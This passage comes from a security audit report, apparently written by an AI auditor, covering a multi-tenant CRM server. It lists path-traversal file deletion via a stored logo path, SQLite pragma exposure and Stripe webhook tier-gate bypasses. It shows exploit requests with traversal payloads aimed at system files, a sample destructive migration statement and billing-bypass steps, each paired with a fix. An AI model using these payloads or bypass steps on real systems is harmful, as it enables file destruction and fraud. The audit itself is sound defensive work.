### [INFO] `metricsCollector` self-rescheduling `setTimeout` chain not stopped during graceful shutdown

**Where:** `packages/server/src/services/metricsCollector.ts:359` — `stopMetricsCollector()` exists but is never called from `packages/server/src/index.ts` shutdown()

**What:**  
`startMetricsCollector()` is called at boot (line 327 of `index.ts`) but `stopMetricsCollector()` is never called in the `shutdown()` function. The `sampleTimer` and `rollupTimer` are `setTimeout` handles that reschedule themselves. They call `.unref()` so they do not prevent process exit on their own, but when `collectorStopped` remains false the chain keeps rescheduling; if the 60 s sample fires after `metricsDb` is closed, a logged error occurs. The `metricsDb` handle inside `metricsCollector.ts` is also never closed during shutdown, leaving the fd open.

**Fix:**  
Call `stopMetricsCollector()` (already exported) inside `shutdown()` in `index.ts`, alongside `stopWebSocketHeartbeat()`.

---

## Summary

| Sev | Count | Title snippet |
|-----|-------|--------------|
| MEDIUM | 3 | bcrypt.compareSync without length guard; pbkdf2Sync/scryptSync on event loop; createReadStream without error handler |
| LOW | 4 | node-cron backup not stopped on shutdown; cron timers lack .unref(); /health DB probe unthrottled; backup reads full DB into RAM |
| INFO | 1 | metricsCollector not stopped on shutdown |


---

# T20-symlink

# T20 — Symlink Attack Sweep: fs.write/unlink/rename/copyFile on User-Influenced Paths

## Scope

Sweep of every `fs.writeFile`, `fs.writeFileSync`, `fs.unlink`, `fs.unlinkSync`,
`fs.rename`, `fs.renameSync`, `fs.copyFile`, `fs.copyFileSync`, `fs.chmod`,
`fs.chmodSync`, `fs.symlink`, and `path.resolve` call across `packages/server/src/`
for symlink-following and path-containment weaknesses.

Focus files examined end-to-end:
- `services/backup.ts`
- `services/tenantTermination.ts`
- `services/tenant-provisioning.ts`
- `services/retentionSweeper.ts`
- `services/tenantExport.ts`
- `services/crashTracker.ts`
- `services/blockchyp.ts`
- `services/tenant-repair.ts`
- `routes/expenseReceipts.routes.ts`
- `routes/tickets.routes.ts`
- `routes/settings.routes.ts`
- `routes/customers.routes.ts`
- `routes/sms.routes.ts`
- `routes/voice.routes.ts`
- `routes/bench.routes.ts`
- `routes/inventory.routes.ts`
- `routes/inventoryEnrich.routes.ts`
- `middleware/fileUploadValidator.ts`
- `index.ts` (signed-URL + `/uploads` static handler)

---

### HIGH — Admin can delete arbitrary server files via store_logo path traversal

**Where:** `packages/server/src/routes/settings.routes.ts:1675–1680`
(write vector at `settings.routes.ts:570–583`)

**What:**
`PUT /api/v1/settings/store` (admin-only) accepts `store_logo` as a free-form string
with no path validation. The value is written verbatim to `store_config`.
When the admin later uploads a new logo (`POST /api/v1/settings/logo`), the handler
reads the previous `store_logo` value, strips the `/uploads/` prefix with a simple
`startsWith` guard, then calls `path.join(config.uploadsPath, relPath)` followed by
`fs.unlinkSync(prevAbs)` — without `path.resolve` + containment check.
`path.join` does not normalize `..` segments, so a stored value like
`/uploads/../../../etc/cron.d/backdoor` produces `prevAbs = /etc/cron.d/backdoor`
and `fs.unlinkSync` deletes that file.

**Code:**
```typescript
// settings.routes.ts:1675-1680
const prevRow = await adb.get<{ value: string }>(
  "SELECT value FROM store_config WHERE key = 'store_logo'"
);
if (prevRow?.value && prevRow.value.startsWith('/uploads/')) {   // ← only check
  const prevAbs = path.join(                                      // ← path.join NOT realpath
    config.uploadsPath,
    prevRow.value.replace(/^\/uploads\//, '')                     // ← traversal survives
  );
  const stat = fs.statSync(prevAbs);
  decrementStorageBytes(req.tenantId, stat.size);
  try { fs.unlinkSync(prevAbs); } catch {}                        // ← deletes arbitrary file
}
```

**Verified locally:**
```
node -e "const path=require('path');
  const uploadsPath='/app/uploads';
  const value='/uploads/../../../etc/passwd';
  console.log(path.join(uploadsPath, value.replace(/^\/uploads\//,'')));"
// → /etc/passwd
```

**Exploit:**
An authenticated tenant admin sends:
```
PUT /api/v1/settings/store
{ "store_logo": "/uploads/../../../etc/cron.d/daily-job" }
```
Then uploads a new logo via `POST /api/v1/settings/logo`.
The server deletes `/etc/cron.d/daily-job` (or any other file writable by the
Node process) without ever touching the actual uploads directory.
Impact ranges from crashing the application (delete config/DB) to privilege
escalation (delete a file whose absence is exploitable).

**Fix:**
After building `prevAbs`, call `fs.realpathSync` and verify the result starts
with `path.resolve(config.uploadsPath) + path.sep` before proceeding.
Alternatively, reject any `store_logo` value in `PUT /settings/store` that
contains `..` or does not match the expected server-generated pattern
(`/uploads/<slug>/<filename>`).

---

### MEDIUM — expenseReceipts DELETE: diskPath built with path.join, no containment check

**Where:** `packages/server/src/routes/expenseReceipts.routes.ts:336–356`

**What:**
The `DELETE /api/v1/expenses/:expenseId/receipt` handler reconstructs the
on-disk path from the stored `file_path` column using `path.join` without a
subsequent `path.resolve` + `startsWith` containment guard. In normal operation
`file_path` is server-generated (random-hex filename), so direct exploitation
requires a tampered DB row. However, if the row is ever written with a traversal
value (e.g. via a future bug or backup-restore of a crafted DB), `safeUnlink`
will delete an arbitrary file.

**Code:**
```typescript
// expenseReceipts.routes.ts:336-356
const storedPath = upload?.file_path ?? expense.receipt_image_path ?? '';
const relPath    = storedPath.replace(/^\/uploads\//, '');
const diskPath   = relPath
  ? path.join(config.uploadsPath, relPath)   // ← no containment guard
  : null;

// ... transaction ...

if (diskPath) safeUnlink(diskPath);           // ← no check before unlink
```

**Exploit:**
If `file_path` in `expense_receipt_uploads` contains `../../../etc/shadow` (e.g.
from a crafted backup restore or future SQL injection), `diskPath` resolves to
`/etc/shadow` and `safeUnlink` deletes it silently. With admin access and access
to the backup-restore flow, a tenant admin could trigger this.

**Fix:**
After computing `diskPath`, resolve and verify containment:
```typescript
const resolved = path.resolve(diskPath);
const safeBase = path.resolve(config.uploadsPath) + path.sep;
if (!resolved.startsWith(safeBase)) {
  logger.error('expenseReceipt DELETE: path escapes uploads root', { diskPath });
  // skip unlink
} else {
  safeUnlink(resolved);
}
```

---

### MEDIUM — sweepOldExports unlinks absolute DB-stored file_path with no containment check

**Where:** `packages/server/src/services/tenantExport.ts:739–754`

**What:**
`sweepOldExports()` reads `file_path` rows from `tenant_exports` and calls
`fsp.unlink(row.file_path)` directly. `file_path` is an absolute path written
at job completion (`path.join(exportsDir, filename)`) and is server-controlled
in normal operation. However, there is no re-verification that the path still
falls under `config.exportsPath` before deletion. A crafted DB row (via backup
restore of a modified export, or future SQLi) could cause the sweeper to delete
an arbitrary absolute path on the server's filesystem.

**Code:**
```typescript
// tenantExport.ts:739-754
for (const row of expired) {
  if (row.file_path) {
    try {
      await fsp.unlink(row.file_path);   // ← absolute path, no containment
    } catch (err: unknown) {
      const code = (err as NodeJS.ErrnoException).code;
      if (code !== 'ENOENT') {
        logger.error('sweepOldExports: unlink failed', { ... });
        continue;
      }
    }
  }
  // DB row deleted
}
```

**Exploit:**
Attacker restores a crafted tenant backup where `tenant_exports.file_path` contains
`/etc/crontab` or a database file. On the next nightly retention sweep, the sweeper
deletes the targeted file without any path guard.

**Fix:**
Verify that `row.file_path` starts with `path.resolve(config.exportsPath) + path.sep`
before calling `fsp.unlink`. Log and skip (do NOT delete the DB row) if containment
fails.

---

### LOW — Logo replacement path traversal also exposes stat of arbitrary file (info leak)

**Where:** `packages/server/src/routes/settings.routes.ts:1678`

**What:**
Before the `unlinkSync` at line 1680, `fs.statSync(prevAbs)` is called on the
same unchecked `prevAbs` path. `statSync` follows symlinks, so if an attacker
places a symlink at a path inside the uploads directory pointing to a sensitive
file (e.g. `master.db`), the `stat.size` of the target is returned. While the
impact is lower than deletion, it leaks file metadata to the attacker through
`decrementStorageBytes` telemetry and, in a future logging change, potentially
through response bodies.

**Code:**
```typescript
const prevAbs = path.join(config.uploadsPath, prevRow.value.replace(/^\/uploads\//, ''));
const stat = fs.statSync(prevAbs);           // ← follows symlinks, no containment
decrementStorageBytes(req.tenantId, stat.size);
```

**Exploit:**
A tenant admin creates a symlink inside the tenant uploads directory pointing to
`/data/master.db`, stores its relative path in `store_logo`, then triggers a logo
upload. `stat.size` of `master.db` is consumed and, if ever surfaced in an API
response or log, leaks the master DB file size.

**Fix:**
Apply the same `fs.realpathSync` + containment check recommended for the HIGH
finding above. Verify the real path before both `statSync` and `unlinkSync`.

---

## SCOPE CLEARED — Areas verified safe

1. **`middleware/fileUploadValidator.ts` counter writes (lines 144–145, 228–229):**
   Uses `tmpPath = counterPath + '.tmp.' + pid + ts` (unique) then `renameSync(tmpPath, counterPath)`.
   `renameSync` replaces the directory entry atomically — if `counterPath` is a symlink it
   replaces the symlink itself, not the target. No symlink-following write occurs.

2. **`services/blockchyp.ts:deleteSignatureFile` (lines 239–243):**
   Has explicit `path.resolve` + `uploadsRoot + path.sep` containment check before any unlink.
   Verified safe.

3. **`routes/tickets.routes.ts:DELETE /photos/:photoId` (lines 2604–2618):**
   Uses `path.resolve(tenantUploadsRoot, photo.file_path)` then verifies
   `filePath.startsWith(tenantUploadsRoot + path.sep)` before unlink. `path.resolve` normalizes
   `..` segments. `fs.unlinkSync` on a symlink removes the symlink entry, not the target — safe.

4. **`routes/tickets.routes.ts:DELETE /devices/:deviceId` (lines 3128–3139):**
   Same pattern as above — resolve + startsWith guard present, and unlinks affect only the
   symlink inode. Verified safe.

5. **`services/retentionSweeper.ts:sweepClosedTicketPhotos` (lines 207–216):**
   Has explicit `resolvedBase` + `path.sep` containment check before every `fs.unlinkSync`.
   Verified safe.

6. **`routes/customers.routes.ts:GDPR erase` (lines 2065–2081):**
   Has `path.resolve(uploadsBase)` + `resolvedBase + path.sep` containment check. Verified safe.

7. **`services/tenantTermination.ts:purgeExpiredDeletions` (lines 455–493):**
   Iterates `fs.readdirSync(deletedDir)` — all filenames come from the OS, not user input.
   `fs.unlinkSync` on a symlink removes the symlink itself (POSIX unlink semantics),
   not the symlink target. Verified safe.

8. **`services/tenant-provisioning.ts` copyFileSync/renameSync (lines 295, 588–590):**
   `dbPath = path.join(config.tenantDataDir, dbFilename)` where `dbFilename = slug + '.db'`
   and slug passes `SLUG_REGEX = /^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/`. No traversal chars
   possible. Verified safe.

9. **`services/crashTracker.ts:cleanupStaleTmpFiles` (lines 123–129):**
   Operates only on `path.dirname(CRASH_LOG_PATH)` (static), iterates `readdirSync`,
   filters on a known prefix. No user input. Verified safe.

10. **`index.ts` signed-URL and `/uploads` static handler (lines 1341–1394):**
    Both paths use `path.resolve` + `startsWith` containment checks. Verified safe.


---

# T21-sqlite-specific

# T21 — SQLite-Specific Injection / Pragma Manipulation / Recursive CTE DoS / FTS5 Quirks

**Slot:** T21
**Date:** 2026-05-06
**Auditor:** Claude (Sonnet 4.6)
**Scope:** `packages/server/src/db/connection.ts`, `db/template.ts`, `db/migrate.ts`, `db/seed.ts`, `services/retentionSweeper.ts`, `services/backup.ts`, `routes/search.routes.ts`, `routes/customers.routes.ts`, `routes/reports.routes.ts`, `index.ts` — and exhaustive grep across all server TypeScript for PRAGMA, ATTACH, LOAD EXTENSION, WITH RECURSIVE, json_each/json_tree, db.exec, db.function, application_id, user_version.

---

## Summary

| SEV | Count |
|-----|-------|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 0 |
| LOW | 1 |
| INFO | 2 |

---

### [LOW] `PRAGMA user_version` exposed to unauthenticated public health probe

**Where:** `packages/server/src/index.ts:1920-1948`

**What:**
The `/api/v1/health/ready` endpoint is public (no `authMiddleware`). It reads `PRAGMA user_version` from the master SQLite DB and returns it as `schemaVersion` in the JSON response body. `user_version` equals the count of applied migrations (158 as of this audit), which precisely fingerprints the deployed application version — including whether specific known-vulnerable migration states are present. An attacker can poll this endpoint from outside the network to determine exactly which version of BizarreCRM is running without any credentials.

**Code:**
```typescript
app.get('/api/v1/health/ready', (_req, res) => {   // no authMiddleware
  // ...
  const row = db.prepare('PRAGMA user_version').get() as { user_version?: number } | undefined;
  userVersion = row?.user_version ?? null;
  // ...
  res.json({
    success: true,
    data: {
      status: 'ready',
      degraded: readyError !== null,
      schemaVersion: userVersion,          // ← unauthenticated disclosure
    },
  });
});
```

**Exploit:**
Any unauthenticated caller `GET /api/v1/health/ready` receives `{"data":{"schemaVersion":158,...}}`. An attacker targeting a known vulnerability in a specific migration window (e.g. a bug fixed in migration 120) can confirm whether a given instance is below or above that version before investing in an exploit attempt. The `degraded` flag also leaks boot-phase state.

**Fix:**
Remove `schemaVersion` from the public readiness probe. Return only `{"status":"ready"}` (or a boolean `ok`). Move the schema-version detail to `/api/v1/health/internal` which is already gated to admin role. If orchestrators genuinely need a schema-version signal, expose it only under an API key or admin auth.

---

### [INFO] `PRAGMA table_info(${table})` without own identifier guard in `columnExists`

**Where:** `packages/server/src/services/retentionSweeper.ts:332-339`

**What:**
`columnExists()` builds `PRAGMA table_info(${table})` by string interpolation. SQLite's PRAGMA syntax cannot accept `?` placeholder bindings for pragmas that take an identifier argument (a documented limitation), so this pattern is technically the only viable approach for this pragma. However, `columnExists` itself performs no identifier validation — it relies entirely on the single call-site (`applyPiiRule`, line 476) having already executed `assertSqlIdent(rule.table, 'table')` earlier in the same function. The `PII_RULES` array is a static constant so no user-controlled input flows here at runtime. The risk is latent: a future caller of `columnExists` that passes a user-supplied table name would silently skip the guard. Note: S12 (Pass 2, I4) already documented this finding with identical analysis.

**Code:**
```typescript
function columnExists(db: Database, table: string, column: string): boolean {
  try {
    const rows = db.prepare(`PRAGMA table_info(${table})`).all()   // ← no guard
      as Array<{ name?: string }>;
    return rows.some((r) => r.name === column);
  } catch {
    return false;
  }
}
// Single call-site — applyPiiRule:476 — already called assertSqlIdent(rule.table) at line 449.
// PII_RULES is a static constant; no user input ever reaches columnExists today.
```

**Exploit:**
No current exploit path. All callers pass static string literals from `PII_RULES`. Latent risk: a future caller that passes user-supplied input could trigger PRAGMA injection that reads arbitrary table schema metadata or causes a parse error that the `catch {}` silently swallows.

**Fix:**
Add `assertSqlIdent(table, 'table')` as the first line of `columnExists`, consistent with the pattern already used by `assertSqlIdent` in `applyRule`/`applyPiiRule`. This costs one regex test and closes the latent vector permanently, independently of call-site discipline.

---

### [INFO] `@no-transaction` directive enables `PRAGMA writable_schema = 1` in migrations

**Where:** `packages/server/src/db/migrate.ts:69-80`, `packages/server/src/db/migrations/074_customer_nullable_on_child_tables.sql:27`

**What:**
`migrate.ts` supports a `-- @no-transaction` header in `.sql` files; such migrations run with `db.unsafeMode(true)` which unlocks `sqlite_master` for direct writes. Migration `074` explicitly sets `PRAGMA writable_schema = 1` to rewrite a `CREATE TABLE` statement in-place. This is a legitimate SQLite technique for schema rewriting, and migration files are server-controlled deployment artifacts — not user input. However, the combination of `unsafeMode(true)` + `writable_schema` during boot means that any compromise of the `packages/server/src/db/migrations/` directory (e.g. a supply-chain or CI/CD injection) could introduce a migration that irreversibly corrupts every tenant's SQLite schema at boot time.

**Code:**
```typescript
if (noTransaction) {
  const unsafe = typeof db.unsafeMode === 'function';
  if (unsafe) db.unsafeMode(true);      // ← sqlite_master write-unlocked
  try {
    db.exec(sql);                        // ← runs migration with writable_schema access
    db.prepare('INSERT INTO _migrations ...').run(file);
  } finally {
    if (unsafe) db.unsafeMode(false);   // ← restored deterministically
  }
}
```

**Exploit:**
Not directly exploitable from the network. Exploit requires write access to the `migrations/` directory or the ability to inject a file there (CI/CD compromise, malicious npm package in the build pipeline). A malicious `-- @no-transaction` migration file could issue `PRAGMA writable_schema = 1; UPDATE sqlite_master SET sql = 'DROP TABLE users'; PRAGMA writable_schema = 0;` on every tenant DB at the next boot.

**Fix:**
Consider computing a SHA-256 checksum manifest of all migration files at build time and verifying the manifest at runtime before executing any `@no-transaction` migration. At minimum, document the attack surface in a security runbook so that CI/CD pipeline integrity controls are understood as a dependency of database schema integrity.

---

## SCOPE CLEARED

The following T21 attack surfaces were exhaustively investigated and found to be safe:

1. **ATTACH DATABASE** — Zero occurrences of `ATTACH` in any `.ts` file under `packages/server/src/`. SQLite `ATTACH` is never called anywhere in the server. No user can trigger a cross-database read/write. Verified with: `grep -rn "ATTACH\b" packages/server/src/ --include="*.ts"` → no results.

2. **LOAD EXTENSION / loadExtension** — Zero occurrences. `better-sqlite3` disables extension loading by default (requires `new Database(path, { fileMustExist: false })` followed by `db.loadExtension(path)` to enable). The codebase never calls `loadExtension`. Verified: `grep -rn "loadExtension\|load_extension\|LOAD EXTENSION" packages/server/src/ --include="*.ts"` → no results.

3. **`db.function` / `db.aggregate` UDFs** — Zero occurrences. No user-defined functions are registered on any database handle. There is no `db.function()` or `db.aggregate()` call in any production code. Verified: `grep -rn "db\.function\|db\.aggregate\|createFunction" packages/server/src/ --include="*.ts"` → no results.

4. **`db.exec(userString)` — multi-statement execution with user input** — `db.exec()` is called in exactly three contexts: (a) `db/migrate.ts` running static `.sql` migration files from disk; (b) `repairDeskImport.ts:2459,2479` running hardcoded `CREATE TRIGGER IF NOT EXISTS` DDL to recreate FTS triggers after a nuclear wipe. None of these receive user-supplied SQL strings. Verified: all `db.exec()` call sites were enumerated.

5. **`WITH RECURSIVE` CTE DoS** — The only `WITH RECURSIVE` in the codebase is in `reports.routes.ts:1624` (`months_cte`). The bound parameter is `months - 1` where `months = Math.min(24, Math.max(1, parseInt(req.query.months, 10) || 12))`. Maximum recursion depth is 23 rows (24 months - 1 seed row). No DoS is possible. The `parseBiDays()` helper used in other report endpoints (line 1920) similarly clamps all user-supplied counts.

6. **`json_each` / `json_tree` on user JSON** — Neither function appears anywhere in the server codebase. T09 also confirmed this independently. No JSON depth-bomb surface exists via SQLite's JSON table-valued functions.

7. **`PRAGMA user_version` / `application_id` set by user** — No route or service accepts user input that flows into `db.pragma('user_version = N')` or `db.pragma('application_id = N')`. The `user_version` is only read (in `index.ts:1935`) for the health probe; `application_id` is never used in the server. Column named `application_id` in Vonage/Bandwidth SMS config is an unrelated SMS API field, not a SQLite pragma.

8. **PRAGMA `table_info` injection** — The only interpolated `PRAGMA table_info(${table})` is in `retentionSweeper.ts:334` (`columnExists`). The table name comes exclusively from the static `PII_RULES` constant array and `assertSqlIdent()` has already validated it at the call-site. The two other `PRAGMA table_info(...)` calls in the codebase (`giftCardCodeHashBackfill.ts:44`, `estimateApprovalTokenHashBackfill.ts:50`) use hardcoded literal table names. No user input ever reaches any of these.

9. **FTS5 query injection / DoS via special tokens** — T09 (I2) already exhaustively audited FTS5 MATCH usage. Both `customers.routes.ts:82` and `search.routes.ts:15` implement `ftsMatchExpr()` which: (a) slices input to 200 chars; (b) strips all chars except `[a-zA-Z0-9À-ɏ\s\-@.]` (removing `"`, `*`, `^`, `+`, `(`, `)`, `:`); (c) wraps each token in double-quotes (`"token"*`); (d) binds the result as a `?` parameter. No FTS5 operator survives the sanitizer. The `^aaaa*` DoS pattern is prevented because `^` is stripped and the `*` suffix is only added after the quoted token, not inside it.

10. **WAL / SHM files world-readable** — SQLite WAL mode is enabled (`journal_mode = WAL` in `connection.ts:14`, `tenant-pool.ts:83`). The DB files reside at `packages/server/dist/../data/bizarre-crm.db` and `packages/server/dist/../data/tenants/*.db` — neither path is inside `packages/web/dist/` (the web-served static directory) or `packages/server/dist/../uploads/` (auth-gated by `authMiddleware`). WAL/SHM sidecars are co-located with the DB files in the `data/` directory which is not mapped to any HTTP route. `template.ts:75-78` explicitly deletes `-wal` and `-shm` files when rebuilding the template DB. Backup restore in `backup.ts:900-903` also clears WAL/SHM before the file swap. No HTTP path exposes raw `.db-wal` or `.db-shm` files.

11. **VACUUM triggered by user input** — No route or API accepts input that invokes `VACUUM` or `PRAGMA incremental_vacuum(N)`. The only vacuum calls are inside the internal cron (`index.ts:2537` on a 60-minute tick) and `metricsCollector.ts:176` on a 24-hour throttle — both hardcoded, no user control over timing or scope.

12. **`OR 1=1` parameterization bypass** — All SQL values go through `db.prepare().run(?)` / `adb.all()` / `adb.get()` parameterization. No `${}` string interpolation of user values was found in WHERE clause value positions after the full audit. The `OR 1=1` pattern is only present as a safe `WHERE 1=1` seed for dynamic query builders (e.g. `expenses.routes.ts`, `voice.routes.ts`), not as a bypass.

13. **`backup_path` directory traversal / arbitrary file read** — `backup.ts:764-773` (`resolveBackupPath`) enforces: (a) `isBackupFile()` filename allowlist (must end in `.db` or `.db.enc`, must start with known prefix or pattern); (b) `..`, `/`, `\` rejection; (c) `path.resolve(full).startsWith(resolvedDir + path.sep)` containment. Download streams only allowed files. The `.meta.json` sidecar is blocked by `isBackupFile` (`!f.endsWith('.db') && !f.endsWith('.db.enc')`). `CRLF` injection via `Content-Disposition: attachment; filename="..."` is mitigated by Node.js 14+ header validation (throws `ERR_HTTP_INVALID_HEADER_VALUE` on `\r\n` in header values).

14. **`backup_schedule` cron injection** — `backup.ts:989` calls `cron.validate(schedule)` before activating any scheduled backup; invalid cron expressions cause the schedule to be skipped silently.


---

# T22-tier-gate

# T22 — Tier Gate Bypass, Downgrade Race, Entitlement Integrity

**Scope:** Plan/tier enforcement, subscription lifecycle, usage counters, feature gating.
**Files audited:** `middleware/tierGate.ts`, `routes/billing.routes.ts`, `services/stripe.ts`, `middleware/tenantResolver.ts`, `services/usageTracker.ts`, `routes/tickets.routes.ts`, `routes/settings.routes.ts`, `routes/super-admin.routes.ts`, `routes/locations.routes.ts`, `routes/dataExportSchedules.routes.ts`, `routes/smsAutoResponders.routes.ts`, `services/dataExportScheduleCron.ts`, `shared/src/constants/plans.ts`, `index.ts`.

---

### HIGH — `checkout.session.completed` webhook upgrades to Pro without validating purchased price ID

**Where:** `packages/server/src/services/stripe.ts:758–847`

**What:**
The `checkout.session.completed` webhook handler grants `plan='pro'` to any tenant whose `client_reference_id` matches a valid tenant, regardless of which Stripe price or product was purchased. The handler never checks `session.line_items` (or `session.amount_total`) against `config.stripeProPriceId`. Any completed Stripe Checkout session for the same Stripe account — including a $0.01 or unrelated product — with a crafted `client_reference_id` will promote the target tenant to the Pro plan indefinitely.

**Code:**
```typescript
case 'checkout.session.completed': {
  const session = event.data.object as Stripe.Checkout.Session;
  const tenantId = parseTenantId(session.client_reference_id);
  // ... validates tenant exists, checks customer ID collision ...
  masterDb.prepare(
    `UPDATE tenants SET plan = 'pro', trial_ends_at = NULL, ... WHERE id = ?`
  ).run(customerId || null, subscriptionId || null, tenantId);
  // ↑ No price/product validation at all
}
```

**Exploit:**
An operator (or someone with access to the Stripe Dashboard) creates a $0.01 Checkout Session in the same Stripe account with `client_reference_id` set to any victim tenant's integer ID. On completion Stripe fires a real `checkout.session.completed` with a valid signature, and the handler promotes the tenant to Pro with no subscription row — bypassing the monthly billing entirely. The tenant retains Pro indefinitely until manually downgraded. In a misconfigured or shared Stripe account this is a complete billing bypass.

**Fix:**
Before calling `applyCheckoutUpgrade()`, retrieve the session's line items from Stripe (`stripe.checkout.sessions.retrieve(session.id, {expand: ['line_items']})`) and assert that `session.line_items.data[0].price.id === config.stripeProPriceId`. Alternatively, verify `session.mode === 'subscription'` AND `session.subscription` is a non-null string, which at minimum confirms a recurring subscription was created. Also store and verify `session.metadata.tenant_id` matches `client_reference_id` to prevent cross-tenant injection.

---

### HIGH — `customer.subscription.updated` does not handle `status='paused'` — Pro plan retained indefinitely

**Where:** `packages/server/src/services/stripe.ts:883–931`

**What:**
The `customer.subscription.updated` handler only acts on `sub.status === 'active'` (keep Pro) or `sub.status === 'canceled' || sub.status === 'unpaid'` (downgrade). Stripe's subscription object also emits `paused`, `trialing`, `past_due`, `incomplete`, and `incomplete_expired` statuses. When a tenant uses the Stripe Billing Portal to pause their subscription — a Stripe-native feature for subscription pause/resume cycles — the webhook fires with `status='paused'`, but the handler falls through the switch without updating the tenant's plan. The tenant retains Pro access for the full duration of the pause.

**Code:**
```typescript
case 'customer.subscription.updated': {
  const sub = event.data.object as Stripe.Subscription;
  if (sub.status === 'active') {
    masterDb.prepare(`UPDATE tenants SET plan = 'pro' ... WHERE id = ?`).run(tenantWithSub.id);
  } else if (sub.status === 'canceled' || sub.status === 'unpaid') {
    masterDb.prepare(`UPDATE tenants SET plan = 'free' ... WHERE id = ?`).run(tenantWithSub.id);
  }
  // status='paused', 'past_due', 'incomplete', 'incomplete_expired' — no action taken
}
```

**Exploit:**
A tenant on Pro pays one billing cycle, then uses Stripe's pause-subscription feature via the Billing Portal. The subscription moves to `status='paused'` (no future charges). The webhook fires but the handler is a no-op for that status — the tenant's DB row stays `plan='pro'` indefinitely. They receive full Pro features without paying. A tenant who knows about this mechanism gets free Pro until an operator manually intervenes or Stripe deletes the subscription.

**Fix:**
Add explicit handling for `paused` status in the `customer.subscription.updated` case: when `sub.status === 'paused'` or `sub.status === 'incomplete_expired'`, downgrade the tenant to free. For `past_due`, set `payment_past_due = 1` (already handled by `invoice.payment_failed`, but belt-and-suspenders here adds resilience). Add `'paused' | 'trialing' | 'past_due' | 'incomplete' | 'incomplete_expired'` to the status union that triggers a plan update.

---

### HIGH — Scheduled data export CRUD and execution cron bypass `scheduledReports` Pro feature gate

**Where:** `packages/server/src/index.ts:1694`, `packages/server/src/services/dataExportScheduleCron.ts:73–103`

**What:**
`scheduledReports` is declared as a Free=false / Pro=true feature in `PLAN_DEFINITIONS` (`packages/shared/src/constants/plans.ts:39`). The route mount at line 1694 of `index.ts` has no `requireFeature('scheduledReports')` middleware, so any authenticated admin on any plan can create, list, update, and delete recurring export schedules. Furthermore, the `dataExportScheduleCron.ts` background worker processes all active schedules for every tenant with no plan check — it runs the export and emails the file regardless of whether the tenant is on the free plan. This entirely bypasses the paid-feature boundary.

**Code:**
```typescript
// index.ts:1694 — no requireFeature:
app.use('/api/v1/data-export/schedules', authMiddleware, dataExportSchedulesRoutes);

// dataExportScheduleCron.ts:73 — no tier check in runForTenant():
async function runForTenant(slug: string | null, db: Database.Database): Promise<void> {
  const dueSchedules = db.prepare(
    `SELECT ... FROM data_export_schedules WHERE status='active' AND next_run_at <= datetime('now')`
  ).all();
  for (const schedule of dueSchedules) {
    await processSchedule(slug, db, schedule); // no plan check
  }
}
```

**Exploit:**
A free-plan tenant admin calls `POST /api/v1/data-export/schedules` with a daily full-database export and a delivery email. The schedule is created without error (no 403). The cron fires hourly, finds the schedule, and emails the tenant a full JSON export of all their data every 24 hours. The tenant effectively has the Pro `scheduledReports` feature for free indefinitely.

**Fix:**
Add `requireFeature('scheduledReports')` to the mount line in `index.ts` before `dataExportSchedulesRoutes`. Also add a plan check inside `runForTenant()` in `dataExportScheduleCron.ts` using the master DB (same pattern as the daily-report cron at `index.ts:3001–3011`) and skip execution for free-plan tenants.

---

### MEDIUM — Ticket limit uses calendar-month bucket; `reserveTicketCreation()` rolling-window function is never called

**Where:** `packages/server/src/routes/tickets.routes.ts:991–1024`, `packages/server/src/routes/tickets.routes.ts:4221–4244`, `packages/server/src/services/usageTracker.ts:245–277`

**What:**
`usageTracker.ts` exports `reserveTicketCreation()` which uses a rolling 30-day window (sums the current + previous month's bucket) and is documented in-code as the correct fix for the calendar-month bypass (`@audit-fixed: #19`). However, both ticket-creation paths in `tickets.routes.ts` (new ticket at line 991 and warranty clone at line 4221) use an inline calendar-month query — `WHERE month = YYYY-MM` — and never call `reserveTicketCreation()`. The function is exported but never imported or used by any route. A free-plan tenant can create 50 tickets on January 31 and 50 more on February 1, totaling 100 tickets in two days without hitting the monthly cap.

**Code:**
```typescript
// tickets.routes.ts:991 (repeated at line 4221):
const month = new Date().toISOString().slice(0, 7); // YYYY-MM — calendar month only
const usage = masterDb.prepare(
  'SELECT tickets_created FROM tenant_usage WHERE tenant_id = ? AND month = ?'
).get(tierReservationTenantId, month);
// reserveTicketCreation() in usageTracker.ts exists but is NEVER imported here
```

**Exploit:**
A free-plan tenant on the last day of the month creates up to 50 tickets. On the first day of the next month they create 50 more. They have 100 tickets in ~24 hours with the Free plan cap bypassed at the month boundary. Repeatable every month.

**Fix:**
Replace both inline calendar-month checks in `tickets.routes.ts` with calls to the existing `reserveTicketCreation()` function from `usageTracker.ts`, which already implements the rolling 30-day window correctly. Remove the inline duplicate code.

---

### MEDIUM — `charge.refunded` webhook does not downgrade tenant entitlement

**Where:** `packages/server/src/services/stripe.ts:968–990`

**What:**
When Stripe issues a full refund on a subscription payment (e.g. through a billing dispute resolution or manual admin refund), Stripe fires `charge.refunded`. The handler in this codebase is audit-only — it logs the event but does NOT update the tenant's plan. A full refund of a subscription payment effectively returns the money to the tenant while they retain Pro access. The downgrade only occurs when the subscription itself is canceled (via `customer.subscription.deleted`) or when Stripe stops retrying failed invoices (after the dunning cycle exhausts, at which point `customer.subscription.updated` with `canceled` fires). A tenant who is refunded mid-cycle and whose subscription is not separately canceled will continue to receive Pro features without having paid.

**Code:**
```typescript
case 'charge.refunded': {
  // ... logs the event and resolves tenant ID ...
  logger.info('Stripe charge refunded', {
    eventId: event.id,
    chargeId: charge.id,
    amountRefunded: charge.amount_refunded,
    tenantId: tenantRow?.id ?? null,
  });
  // ↑ No plan update — tenant retains Pro if subscription is still 'active'
}
```

**Exploit:**
Tenant on Pro pays for a month, then contacts support claiming a billing error. The operator issues a full refund in the Stripe Dashboard. Stripe fires `charge.refunded`; the handler is a no-op for plan state. Subscription status remains `active`; tenant retains Pro access indefinitely. The tenant essentially received the plan for free.

**Fix:**
In the `charge.refunded` handler, check `charge.amount_refunded === charge.amount` (fully refunded) and, if so, optionally flag the tenant with `payment_past_due = 1` and enqueue an ops alert rather than silently logging. For fully-automated enforcement, also check `charge.refunded.metadata` or the associated invoice to determine whether this is a subscription charge and, if so, downgrade the tenant pending explicit renewal. At minimum add an audit log entry to `master_audit_log` so operators can manually review refunded tenants.

---

### MEDIUM — `customer.subscription.updated` with `status='trialing'` silently retains/grants Pro

**Where:** `packages/server/src/services/stripe.ts:897–930`

**What:**
